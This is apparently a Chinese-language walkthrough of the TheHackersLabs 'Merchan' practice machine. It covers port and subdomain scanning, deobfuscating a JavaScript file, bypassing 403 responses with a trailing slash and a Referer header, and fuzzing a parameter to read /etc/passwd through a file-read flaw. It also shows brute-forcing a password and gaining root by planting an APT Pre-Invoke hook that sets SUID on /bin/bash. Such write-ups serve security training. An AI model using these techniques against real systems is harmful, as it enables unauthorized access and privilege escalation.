{"pageProps":{"postData":{"id":"TheHackersLabsMerchan","contentHtml":"<h1>Merchan</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/109\">https://labs.thehackerslabs.com/machine/109</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Merchan nmap -sT -min-rate 10000 -p- 192.168.56.99\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:48 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.99\nHost is up (0.00078s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.81 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Merchan nmap -sT -A -p 22,80 192.168.56.99                                                \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:49 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.99\nHost is up (0.00048s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\n| ssh-hostkey: \n|   256 da:68:54:15:39:b8:44:ed:b9:08:4c:59:e5:89:50:08 (ECDSA)\n|_  256 b4:7d:98:a8:01:e8:3b:17:43:24:43:39:3a:b4:b8:50 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://merchan.thl\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.48 ms 192.168.56.99\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.52 seconds\n</code></pre>\n<h2>Web</h2>\n<h3>子域名 &#x26; 目录 爆破</h3>\n<p>访问 <code>HTTP</code> ，这个页面什么功能点都没有</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image1.png\" alt=\"image.png\"></p>\n<p>尝试爆破一下子域名，只有 <code>www</code></p>\n<pre><code class=\"hljs language-bash\">➜  Merchan ffuf -u <span class=\"hljs-string\">'http://merchan.thl/'</span> -H <span class=\"hljs-string\">'host: FUZZ.merchan.thl'</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fw=18 \n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://merchan.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.merchan.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 18\n________________________________________________\n\nwww                     [Status: 200, Size: 7235, Words: 2986, Lines: 131, Duration: 866ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:54] :: Errors: 0 ::\n</span></code></pre>\n<p>目录爆破，能扫描出来一个 <code>secret.js</code></p>\n<pre><code class=\"hljs language-bash\">➜  Merchan feroxbuster --url http://merchan.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip\n...\n404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        9l       28w      311c http://merchan.thl/images => http://merchan.thl/images/\n200      GET        7l       36w      330c http://merchan.thl/js/scripts.js\n200      GET    10826l    22299w   236792c http://merchan.thl/css/styles.css\n301      GET        9l       28w      311c http://merchan.thl/assets => http://merchan.thl/assets/\n301      GET        9l       28w      308c http://merchan.thl/css => http://merchan.thl/css/\n301      GET        9l       28w      307c http://merchan.thl/js => http://merchan.thl/js/\n200      GET        8l       29w    28898c http://merchan.thl/assets/favicon.ico\n200      GET      563l     3920w   380306c http://merchan.thl/images/sudadera.png\n200      GET      139l      592w    68236c http://merchan.thl/images/camiseta.jpg\n200      GET      186l      943w    74237c http://merchan.thl/images/llavero.jpg\n200      GET      130l      399w     7235c http://merchan.thl/\n200      GET        1l       15w     1365c http://merchan.thl/secret.js\n</code></pre>\n<p>被混淆过了</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image2.png\" alt=\"image.png\"></p>\n<p>直接通过 AI 复原即可</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">createLink</span></span>(){\n    const _0xd35862 = _0x4b23, // _0xd35862 是解码函数的别名\n          _0x398463 = <span class=\"hljs-string\">'2e81eb4e952a3268babddecad2a4ec1e.php'</span>,\n          _0x199a7f = document[_0xd35862(0x17b)](<span class=\"hljs-string\">'a'</span>);\n\n    _0x199a7f[_0xd35862(0x17d)] = _0xd35862(0x171);\n    _0x199a7f[_0xd35862(0x177)] = _0x398463;\n    document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);\n}\n_0xd35862(0x17b) -> 解码后是 <span class=\"hljs-string\">'createElement'</span>\n_0xd35862(0x17d) -> 解码后是 <span class=\"hljs-string\">'innerText'</span>\n_0xd35862(0x171) -> 解码后是 <span class=\"hljs-string\">'Haga\\x20click\\x20aqui'</span> (即 <span class=\"hljs-string\">\"Haga click aqui\"</span>)\n_0xd35862(0x177) -> 解码后是 <span class=\"hljs-string\">'href'</span>\n_0xd35862(0x174) -> 解码后是 <span class=\"hljs-string\">'body'</span>\n_0xd35862(0x179) -> 解码后是 <span class=\"hljs-string\">'appendChild'</span>\n</code></pre>\n<p>也就是会打开 <code>2e81eb4e952a3268babddecad2a4ec1e.php</code></p>\n<p>但是我们跳转后发现，还是会提示 <code>403</code> （任何 <code>php</code> 页面都是）</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image3.png\" alt=\"image.png\"></p>\n<p>尝试<code>bypass403</code> ，直接加上斜杠即可</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image4.png\" alt=\"image.png\"></p>\n<p>但是访问还是空白的</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image5.png\" alt=\"image.png\"></p>\n<h3>模糊测试</h3>\n<p>我们对其进行模糊测试，首先测试任意文件读取</p>\n<p>但是加上参数后，还是提示了 <code>403</code></p>\n<pre><code class=\"hljs language-bash\">http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd\n</code></pre>\n<p>再次进行绕过</p>\n<p>这里工具并无法进行绕过了</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image6.png\" alt=\"image.png\"></p>\n<p>我们进行手动绕过，最后加上 <code>Referer</code> 即可绕过</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image7.png\" alt=\"image.png\"></p>\n<p>我们再次进行</p>\n<pre><code class=\"hljs language-bash\">➜  Merchan ffuf -u <span class=\"hljs-string\">'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd'</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -H <span class=\"hljs-string\">'Referer: http://merchan.thl/'</span> --fs=0\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Referer: http://merchan.thl/\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\nfile                    [Status: 200, Size: 1187, Words: 27, Lines: 23, Duration: 0ms]\n</span></code></pre>\n<h3>任意文件读取 &#x26; 密码爆破</h3>\n<p>枚举出来参数 <code>file</code></p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image8.png\" alt=\"image.png\"></p>\n<p>我们读取 <code>2e81eb4e952a3268babddecad2a4ec1e.php</code> 的源码</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php&#x3C;br />\n<span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'file'</span>] ?? <span class=\"hljs-string\">''</span>;&#x3C;br />\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$file</span>) {&#x3C;br />\n<span class=\"hljs-built_in\">echo</span> nl2br(file_get_contents(<span class=\"hljs-variable\">$file</span>));&#x3C;br />\n}&#x3C;br />\n?>&#x3C;br />\n</code></pre>\n<p>到这里测试了可以使用伪协议但是不能执行语句，也不可以包含，<code>julia</code> 前 <code>5000</code> 也没爆破出来有点没思路</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image9.png\" alt=\"image.png\"></p>\n<p>看了下 <code>WP</code>，发现密码在 <code>rockyou</code> <code>7000</code>行… (PS：规则明明说爆破需要设置不超<code>5000</code>行的)</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image10.png\" alt=\"image.png\"></p>\n<p>用户家目录下读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">julia@Thehackerslabs-merchan:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nb4axxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p><code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">julia@Thehackerslabs-merchan:~$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span>: unable to resolve host Thehackerslabs-merchan: Fallo temporal en la resolución del nombre\n[<span class=\"hljs-built_in\">sudo</span>] contraseña para julia: \nSorry, user julia may not run <span class=\"hljs-built_in\">sudo</span> on Thehackerslabs-merchan.\n</code></pre>\n<p>上传 <code>linpeas</code></p>\n<pre><code class=\"hljs language-bash\">╔══════════╣ Interesting writable files owned by me or writable by everyone (not <span class=\"hljs-keyword\">in</span> Home) (max 200)\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files \n/dev/mqueue\n/dev/shm\n/etc/apt/apt.conf.d\n/home/julia\n</code></pre>\n<p>看到一个有趣的可写目录 <code>/etc/apt/apt.conf.d</code></p>\n<blockquote>\n<p><a href=\"https://zhuanlan.zhihu.com/p/1888937295215851002\">https://zhuanlan.zhihu.com/p/1888937295215851002</a></p>\n</blockquote>\n<p>当系统运行 <code>apt update</code> 时，会加载 <code>/etc/apt/apt.conf.d</code> 文件夹的所有配置文件</p>\n<pre><code class=\"hljs language-scheme\">echo 'APT::Update::Pre-Invoke {\"chmod +s /bin/bash\"}' > a\n</code></pre>\n<p>过了一会之后我们再查看 <code>/bin/bash</code> 权限</p>\n<p><img src=\"/post-images/TheHackersLabsMerchan/image11.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-scheme\">bash-5.2# cat root.txt \n056e7xxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>","title":"TheHackersLabs - Merchan","date":"2025-07-31","updated":"2025-07-31","tags":["TheHackersLabs","Linux","APT","LFI","Crack"],"categories":"靶机","comments":true,"description":"Merchan https://labs.thehackerslabs.com/machine/109 Recon PortScan Web 子域名 & 目录 爆破 访问 HTTP ，这个页面什么功能点都没有 尝试爆破一下子域名，只有 www 目录爆破，能扫描出来一个 secret.js 被混淆过了..."},"recentPosts":[{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}